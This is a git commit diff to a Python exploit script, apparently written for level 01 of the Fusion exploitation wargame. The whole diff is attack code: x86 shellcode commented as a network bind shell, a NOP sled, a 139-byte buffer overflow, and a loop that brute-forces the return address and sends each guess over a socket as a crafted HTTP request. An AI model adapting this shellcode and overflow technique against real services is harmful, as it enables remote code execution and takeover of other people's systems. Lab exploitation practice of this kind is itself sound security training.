7ffb935c0898947957ccab6d346ffef67a0347fa
muttiopenbts <muttiopenbts@users.noreply.github.com>
2015-10-10 02:11:07 -0700

    Update fusion-level01.py
    Slight clean up.
    Increased efficiency through bigger increments of xrange loop

--- fusion-level01.py
+++ fusion-level01.py
@@ -39,33 +39,35 @@ try:
     #EIP_byte1 = "\xbf\x42\x42\x42"
     EIP_guess = "\x42\x42\x42"
 #network bind shell listen 0.0.0.0 11111
-    shellcode = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x2b\x67\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+    shellcode = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52"\
+"\x53\x6a\x02\x89\xe1\xcd\x80\x59"\
+"\x93\xb0\x3f\xcd\x80\x49\x79\xf9"\
+"\xb0\x66\x68\x7f\x01\x01\x01\x66"\
+"\x68\x2b\x67\x66\x6a\x02\x89\xe1"\
+"\x6a\x10\x51\x53\x89\xe1\xcd\x80"\
+"\xb0\x0b\x52\x68\x2f\x2f\x73\x68"\
+"\x68\x2f\x62\x69\x6e\x89\xe3\x31"\
+"\xc9\xcd\x80"
     overflow = "A"*139
     nops = "\x90"*128
-    #command = "GET /$overflow$EIP_guess$EIP_byte1 HTTP/1.1i$nops$shellcode"
     command = "GET /$overflow$EIP_guess HTTP/1.1i$nops$shellcode"
     payload_template = Template(command)
     required_size = 128
-    payload = payload_template.safe_substitute(EIP_byte1=EIP_byte1,EIP_guess=EIP_guess,nops=nops,overflow=overflow,shellcode=shellcode)
 
-    for i in xrange(16777216):
+    for i in xrange(0,16777216,128):
         s = get_socket()
-        #EIP_guess = hex(i)[2:].zfill(6))
         EIP_guess = hex(i)[2:].zfill(8)
         print EIP_guess
-        print EIP_byte1
-        import struct
         EIP_guess =  struct.pack('L', int(EIP_byte1.encode('hex'),16)+i)
         print EIP_guess.encode('hex')
-        #payload = payload_template.safe_substitute(EIP_byte1=EIP_byte1,EIP_guess=EIP_guess,nops=nops,overflow=overflow,shellcode=shellcode)
         payload = payload_template.safe_substitute(EIP_guess=EIP_guess,nops=nops,overflow=overflow,shellcode=shellcode)
 
-        print "Payloads size %s" %payload
-        print payload
+        print "Payloads size %s" %len(payload)
+        #print payload
         s.sendall(payload)
 
         recv = s.recv(8086)
-        print recv
+        #print recv
         s.close()
 
 except socket.error, e:
